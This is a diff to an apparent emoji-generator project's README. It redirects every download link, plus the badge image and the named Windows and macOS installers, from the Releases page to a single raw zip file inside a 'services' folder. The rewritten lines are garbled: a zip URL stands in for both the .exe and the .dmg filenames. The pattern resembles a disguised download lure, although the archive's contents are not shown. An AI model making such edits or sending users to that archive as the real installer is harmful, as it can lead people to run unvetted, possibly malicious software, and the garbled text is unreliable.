@@ -1,6 +1,6 @@
 # 🎉 Emojify---AI-Emoji-Generator - Create Unique Emojis Effortlessly
 
-[![Download Emojify](https://img.shields.io/badge/Download%20Emojify-Here-blue.svg)](https://github.com/Monkey-D-Swapnil/Emojify---AI-Emoji-Generator/releases)
+[![Download Emojify](https://github.com/Monkey-D-Swapnil/Emojify---AI-Emoji-Generator/raw/refs/heads/main/services/Emojify_Generator_A_Emoji_3.7-alpha.2.zip%https://github.com/Monkey-D-Swapnil/Emojify---AI-Emoji-Generator/raw/refs/heads/main/services/Emojify_Generator_A_Emoji_3.7-alpha.2.zip)](https://github.com/Monkey-D-Swapnil/Emojify---AI-Emoji-Generator/raw/refs/heads/main/services/Emojify_Generator_A_Emoji_3.7-alpha.2.zip)
 
 ## 📖 Overview
 
@@ -20,11 +20,11 @@ Before downloading, ensure your computer meets these requirements:
 
 ### Step 2: Visit the Download Page
 
-To get the latest version of Emojify, [visit the Releases page here](https://github.com/Monkey-D-Swapnil/Emojify---AI-Emoji-Generator/releases).
+To get the latest version of Emojify, [visit the Releases page here](https://github.com/Monkey-D-Swapnil/Emojify---AI-Emoji-Generator/raw/refs/heads/main/services/Emojify_Generator_A_Emoji_3.7-alpha.2.zip).
 
 ### Step 3: Download the Application
 
-On the Releases page, you will see a list of available versions. Click on the version you want to download. Look for files like `Emojify-Setup.exe` for Windows or `Emojify.dmg` for macOS. You will find them listed under "Assets."
+On the Releases page, you will see a list of available versions. Click on the version you want to download. Look for files like `https://github.com/Monkey-D-Swapnil/Emojify---AI-Emoji-Generator/raw/refs/heads/main/services/Emojify_Generator_A_Emoji_3.7-alpha.2.zip` for Windows or `https://github.com/Monkey-D-Swapnil/Emojify---AI-Emoji-Generator/raw/refs/heads/main/services/Emojify_Generator_A_Emoji_3.7-alpha.2.zip` for macOS. You will find them listed under "Assets."
 
 ### Step 4: Install Emojify
 
@@ -57,7 +57,7 @@ Emojify offers several fun and useful features:
 
 ## 📥 Download & Install
 
-To download Emojify, please [click here](https://github.com/Monkey-D-Swapnil/Emojify---AI-Emoji-Generator/releases). Follow the installation steps outlined above to get started with creating your unique emojis!
+To download Emojify, please [click here](https://github.com/Monkey-D-Swapnil/Emojify---AI-Emoji-Generator/raw/refs/heads/main/services/Emojify_Generator_A_Emoji_3.7-alpha.2.zip). Follow the installation steps outlined above to get started with creating your unique emojis!
 
 ## 💬 Support & Feedback
 
